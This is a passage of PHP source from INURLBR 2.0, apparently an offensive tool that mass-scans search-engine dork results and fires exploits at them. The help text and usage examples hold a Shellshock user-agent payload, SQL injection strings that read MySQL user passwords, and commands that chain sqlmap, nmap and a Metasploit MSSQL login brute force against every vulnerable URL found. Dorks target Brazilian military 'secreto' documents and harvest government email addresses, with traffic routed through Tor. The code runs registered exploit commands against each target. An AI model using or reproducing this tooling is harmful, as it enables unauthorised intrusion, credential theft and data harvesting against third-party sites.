      Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
          
 {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Filter results in unique domains.
      Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
          
 {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Delay between research processes.
      Example: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
  
 {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Timeout to exit the process.
      Example: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10

 {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filter URLs based on their argument.
      Example: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=

 {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
      Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200

 {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
      Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
 
 {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limits the number of pages in the search engines.
     Example: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
     
 {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Define the user agent used in its request against the target.
      Example: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
      Complete command:    
      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 
 {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
     Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt

 {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Every vulnerable URL found will execute this command parameters.
     Example: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use this commmand to specify a single command to EVERY URL found.
     Example: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
    [!] Observation:
   
    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
   {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
   
   {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
   
   {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
   The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}

 {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
    Example:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
              
 {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    All Major Credit Cards:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
    
    IP Addresses:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
    
    EMAIL:   
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
    

 {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    EMAIL:   
    Usage:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
 

    [!] Small commands manager:
    
 {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
         
 {$_SESSION["c1"]}--exploit-vull-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: {$_SESSION["c1"]}--exploit-vull-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-vull-id {$_SESSION["c2"]}1,2,8,22

 {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.


    [!] Running subprocesses:
    
 {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
         
 {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   {$_SESSION["c1"]}--sub-get

");
}

function __info() {

    return system("command clear") . __getOut("
 {$_SESSION["c1"]}_____ _   _ ______ ____  
|_   _| \ | |  ____/ __ \ 
  | | |  \| | |__ | |  | |
  | | | . ` |  __|| |  | |
 _| |_| |\  | |   | |__| |
|_____|_| \_|_|    \____/
 
{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}0x{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GRUPO  INURL BRASIL - PESQUISA AVANÇADA.
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: INURLBR 2.0
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Nick:     Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Email:    inurlbr@gmail.com  
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Blog:     http://blog.inurl.com.br
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Twitter:  https://twitter.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Facebook: https://fb.com/InurlBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GIT:      https://github.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Pastebin  https://pastebin.com/u/Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PSS:      https://packetstormsecurity.com/user/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}YOUTUBE:  http://youtube.com/c/INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PLUS:     http://google.com/+INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Version:  2.0

{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c16"]}NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$_SESSION["c0"]}
	
     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} LIB & CONFIG{$_SESSION["c0"]}

 * PHP Version         5.4.7
 * php5-curl           LIB
 * php5-cli            LIB   
 * cURL support        enabled
 * cURL Information    7.24.0
 * allow_url_fopen     On
 * permission          Reading & Writing
 * User                root privilege, or is in the sudoers group
 * Operating system    LINUX
 * Proxy random        TOR 
                
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}PERMISSION EXECUTION: chmod +x inurlbr.php{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CURL: sudo apt-get install php5-curl{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CLI: sudo apt-get install php5-cli{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033[0m
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
   
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}

     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}
   
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c0"]} 
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}?´0x27{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´0x27\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´0x27\"{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?pass=1234\" {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello! admin</title>'{$_SESSION["c0"]}
   ./inurlbr.php {$_SESSION["c1"]}--target{$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find_valid_cod-200.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}5{$_SESSION["c0"]}

   {$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
  
  {$_SESSION["c1"]}0x{$_SESSION["c16"]}It it also useful to know the full path to the PHP binary on your computer. {$_SESSION["c0"]}
  {$_SESSION["c1"]}0x{$_SESSION["c16"]}There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$_SESSION["c0"]}

  googleinurl@inurlbr:~$ which php 
  /usr/bin/php 
  googleinurl@inurlbr:~/cli$ whereis php 
  php: /usr/bin/php /usr/share/php /usr/share/man/man1/php.1.gz 
  googleinurl@inurlbr:~/cli$ type -a php 
  php is /usr/bin/php

{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}


");
}

################################################################################
#BANNER HOME####################################################################

function __bannerLogo() {

    $vis = ($_SESSION["os"] != 1) ? ("\033[1;3" . rand(1, 10) . "m") : NULL;

    return (!is_null($_SESSION['config']['no-banner']) ? NULL : system("command clear") . "
{$vis}    _____ {$_SESSION["c1"]} .701F. .iBR.   .7CL. .70BR.   .7BR. .7BR'''Cq.   .70BR.      {$_SESSION["c12"]}.1BR'''Yp, .8BR'''Cq.  
{$vis}   (_____){$_SESSION["c1"]}   01     01N.    C     01       C     01   .01.    01        {$_SESSION["c3"]}  01    Yb   01   .01. 
{$vis}   (() ()){$_SESSION["c1"]}   01     C YCb   C     01       C     01   ,C9     01        {$_SESSION["c12"]}  01    dP   01   ,C9  
{$vis}    \   / {$_SESSION["c1"]}   01     C  .CN. C     01       C     0101dC9      01        {$_SESSION["c3"]}  01'''bg.   0101dC9   
{$vis}     \ /  {$_SESSION["c1"]}   01     C   .01.C     01       C     01  YC.      01      , {$_SESSION["c12"]}  01    .Y   01  YC.   
{$vis}     /=\  {$_SESSION["c1"]}   01     C     Y01     YC.     ,C     01   .Cb.    01     ,C {$_SESSION["c3"]}  01    ,9   01   .Cb. 
{$vis}    [___] {$_SESSION["c1"]} .J01L. .JCL.    YC      .b0101d'.   .J01L. .J01. .J01010101C {$_SESSION["c12"]}.J0101Cd9  .J01L. .J01./ {$_SESSION["c1"]}2.0\n
{$_SESSION["c1"]}__[ ! ] Neither war between hackers, nor peace for the system.
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://blog.inurl.com.br
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://fb.com/InurlBrasil
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://twitter.com/@googleinurl{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}http://github.com/googleinurl{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current PHP version::[ {$_SESSION["c1"]}" . phpversion() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current script owner::[ {$_SESSION["c1"]}" . get_current_user() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current uname::[ {$_SESSION["c1"]}" . php_uname() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c16"]}Current pwd::[ {$_SESSION["c1"]}" . getcwd() . " {$_SESSION["c16"]}]{$_SESSION["c0"]}
{$_SESSION["c1"]}__[ ! ] {$_SESSION["c0"]}{$_SESSION["c2"]}Help: php inurlbr.php --help{$_SESSION["c0"]}
{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
");
}

################################################################################
#CHANGE PROXY FUNCTION IN TIME##################################################

function __timeValueChangeProxy($sec = NULL) {

    return not_isnull_empty($sec) ? date('Y-m-d H:i:s', strtotime(date('Y-m-d H:i:s') . " + {$sec} second")) : NULL;
}

function __timeSecChangeProxy($list_proxy) {

    if ($_SESSION["config"]["time_change_proxy"] < date('Y-m-d H:i:s') && !is_null($list_proxy)) {
        $proxy = $list_proxy[rand(0, count($list_proxy) - 1)];
        echo ("[ INFO ][PROXY] CHANGE: {$proxy}  - " . date('Y-m-d H:i:s') . "\n");
        $_SESSION["config"]["proxy"] = $proxy;
        $_SESSION["config"]["time_change_proxy"] = __timeValueChangeProxy($_SESSION["config"]["time-proxy"]);
        __plus();
    }
}

################################################################################
#GET STATUS HTTP URL############################################################

function __getStatusURL($url) {

    if (!is_null($url) && !empty($url)) {
        return FALSE;
    }
    __plus();
    $status = array();
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    $resultadoCurl = curl_exec($curl);
    if ($resultadoCurl) {
        preg_match_all('(HTTP.*)', $resultadoCurl, $status['http']) . __plus();

        return (!is_null($status['http']) && !empty($status['http'])) ? TRUE : FALSE;
    }
    unset($curl);
    return FALSE;
}

################################################################################
#BEEP ##########################################################################

function __cli_beep() {

    echo ($_SESSION['config']['beep']) ? "\x07" : NULL;
}

################################################################################
#SETUP TO RUN COMMANDS IN ID####################################################

function __configExploitsExec($id, $alvo) {

    $resultadoURL = __configExploitsList();
    $final = array();
    $id_ = ((strstr($id, ','))) ? explode(',', $id) : array($id); // MULTIPLAS ID'S EXPLOITS

    foreach ($resultadoURL as $key) {
        $__key = strstr($key, '::') ? explode("\n", $key) : NULL;
        $final = is_array($__key) ? array_merge($final, $__key) : $final;
    }
    foreach ($id_ as $value) {
        $final__ = isset($value) && !empty($value) ? explode('::', $final[$value]) : NULL;
        $barra = "{$_SESSION["c1"]}[ INFO ]|___{$_SESSION["c0"]}\n";
        $barra.= "      {$_SESSION["c1"]}|";
        print !is_null($final__) ? "\n{$barra}[ EXPLOIT ]:: {$final__[0]} /[ ID ]:: {$value} /[ COMMAND ]:: " . $final__[1] : NULL;
        echo "\n      ------------------------------------------------------------------------------------------------------------------";
        print !is_null($final__) ? __command($final__[1], $alvo) : NULL;
        __plus();
    }
}

function __configExploitsList($op = NULL) {

    $resultadoURL = array_unique(array_filter(explode("\n", file_get_contents($_SESSION['config']['file_exploit_conf']))));

    if (!is_null($op)) {
        echo __bannerlogo();
        echo $_SESSION["c11"];
        echo "[*]__\n";
        echo "     |MENU EXPLOITS:";
        echo "\n     |ID TYPE_EXPLOIT::EXPLOIT_COMMAND";
        echo "\n     |FILE CONFIG: {$_SESSION['config']['file_exploit_conf']}";
        echo "\n     |USE COMMAND EX: --exploit-id '1,2,3,19'";
        echo "\n-----------------------------------------------------------------------------------------------------------------------\n";
        print_r($resultadoURL);
        __getOut("{$_SESSION['config']['line']}\n");
    } else {
        return is_array($resultadoURL) ? $resultadoURL : NULL;
    }
}

function __configExploitsADD($valor = NULL) {

    if (!is_null($valor) && preg_match("(([a-zA-Z0-9-].*)(::.*)([a-zA-Z0-9-]))", $valor)) {
        echo __bannerlogo();
        echo $_SESSION["c11"];
        echo "[*]__\n";
        echo "     |MENU EXPLOITS:";
        echo "\n     |ID TYPE_EXPLOIT::EXPLOIT_COMMAND";
        echo "\n     |STATUS: ADDED VALUE WITH SUCCESS!";
        echo "\n     |VALUE: {$valor}";
        echo "\n-----------------------------------------------------------------------------------------------------------------------\n";
        __saveValue($_SESSION['config']['file_exploit_conf'], $valor, 2);
        print_r(__configExploitsList());
        __getOut("{$_SESSION['config']['line']}\n");
    } else {

